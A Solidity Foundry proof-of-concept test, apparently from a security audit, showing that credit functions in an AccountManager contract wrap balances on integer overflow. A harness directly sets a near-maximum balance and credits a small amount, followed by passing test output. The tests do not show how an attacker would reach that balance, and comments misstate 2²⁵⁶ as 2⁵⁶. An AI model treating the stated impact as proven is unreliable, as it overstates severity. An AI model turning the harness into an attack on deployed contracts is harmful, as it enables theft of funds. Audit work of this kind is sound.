// SPDX-License-Identifier: MIT
/*──────────────────────────────────────────────────────────────────────────────
|   H-03  Integer Overflow in credit functions - Proof-of-Concept
| ──────────────────────────────────────────────────────────────────────────────
| Vulnerability
| -------------
| The `_creditAccount` and `_creditAccountNoEvent` functions in the
| `AccountManager` contract use `unchecked` blocks for arithmetic operations.
| This allows for integer overflows to occur without being detected.
|
| Impact
| ------
| An attacker can exploit this vulnerability to wrap their account balance,
| effectively creating a very large balance from a small one. This could be
| used to manipulate markets, steal funds from the protocol, or cause other
| unforeseen issues.
|
| Proof-of-Concept
| ----------------
| •  test_overflow_creditAccount() demonstrates the overflow by setting an
|    account's balance to a value very close to `type(uint256).max` and then
|    crediting a small amount, causing the balance to wrap.
| •  test_overflow_creditAccountNoEvent() does the same for the non-event-
|    emitting version of the function.
──────────────────────────────────────────────────────────────────────────────*/
/*──────────────────────────────────────────────────────────────────────────────
|   H-03  Integer Overflow in credit functions - Proof-of-Concept
| ──────────────────────────────────────────────────────────────────────────────
| ⚠️  Compiler-warning notice
| ──────────────────────────────────────────────────────────────────────────────
| While compiling this PoC you will see a warning of the form
|
|     Warning 5667: Unused function parameter ...
|
| It comes from:
|   • contracts/clob/types/Book.sol : `getOrdersPaginated(Book storage self, … )`
|
| We cannot modify production contracts in this PoC, so the parameter remains
| unused.  The message is informational only and does **not** affect test
| results or vulnerability validity.  Feel free to ignore it.
──────────────────────────────────────────────────────────────────────────────*/
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {AccountManager} from "contracts/account-manager/AccountManager.sol";

/*************************************************
 *  Harness
 *************************************************/
contract AccountManagerHarness is AccountManager {
    constructor()
        AccountManager(
            address(0x7777), // dummy gteRouter
            address(0x8888), // dummy clobManager
            new uint16[](1), // dummy maker fee table
            new uint16[](1) // dummy taker fee table
        )
    {
        // The calling test contract is implicitly the owner
    }

    /*  Expose the internal functions  */
    function exposedCredit(
        address account,
        address token,
        uint256 amount
    ) external {
        _creditAccount(_getAccountStorage(), account, token, amount);
    }

    function exposedCreditNoEvent(
        address account,
        address token,
        uint256 amount
    ) external {
        _creditAccountNoEvent(_getAccountStorage(), account, token, amount);
    }

    /*  Helper for tests – directly mutate storage  */
    function forceSet(address account, address token, uint256 newBal) external {
        _getAccountStorage().accountTokenBalances[account][token] = newBal;
    }

    function balanceOf(
        address account,
        address token
    ) external view returns (uint256) {
        return _getAccountStorage().accountTokenBalances[account][token];
    }
}

/*************************************************
 *  Tests (PoC)
 *************************************************/
contract H03_IntegerOverflowTest is Test {
    AccountManagerHarness mgr;
    address attacker = address(0xbeef);
    address token = address(0xdead);

    function setUp() public {
        mgr = new AccountManagerHarness();
    }

    /* ------------------------------------------- */
    /*  1.  Overflow via _creditAccount            */
    /* ------------------------------------------- */
    function test_overflow_creditAccount() public {
        uint256 nearMax = type(uint256).max - 50; // 2⁵⁶-1  – 50
        mgr.forceSet(attacker, token, nearMax);

        // This should wrap to 49 (nearMax + 100 – 2⁵⁶).
        mgr.exposedCredit(attacker, token, 100);

        uint256 bal = mgr.balanceOf(attacker, token);
        assertEq(bal, 49, "balance wrapped incorrectly (overflow hit)");
    }

    /* ------------------------------------------- */
    /*  2.  Overflow via _creditAccountNoEvent     */
    /* ------------------------------------------- */
    function test_overflow_creditAccountNoEvent() public {
        uint256 nearMax = type(uint256).max - 1; // 2⁵⁶-1  – 1
        mgr.forceSet(attacker, token, nearMax);

        // nearMax + 2  →  0
        mgr.exposedCreditNoEvent(attacker, token, 2);

        uint256 bal = mgr.balanceOf(attacker, token);
        assertEq(bal, 0, "balance wrapped incorrectly (overflow hit)");
    }
}

// forge test --match-path test/PoC/PoCHighIntegerOverflow.t.sol -vvv
// [⠊] Compiling...
// [⠒] Compiling 1 files with Solc 0.8.27
// [⠢] Solc 0.8.27 finished in 1.04s
// Compiler run successful with warnings:
// Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this war
// ning.                                                                                                    --> contracts/clob/types/Book.sol:202:9:
//     |
// 202 |         Book storage self,
//     |         ^^^^^^^^^^^^^^^^^

// Ran 2 tests for test/PoC/PoCHighIntegerOverflow.t.sol:H03_IntegerOverflowTest
// [PASS] test_overflow_creditAccount() (gas: 64589)
// [PASS] test_overflow_creditAccountNoEvent() (gas: 27749)
// Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 640.13µs (290.35µs CPU time)

// Ran 1 test suite in 5.65ms (640.13µs CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
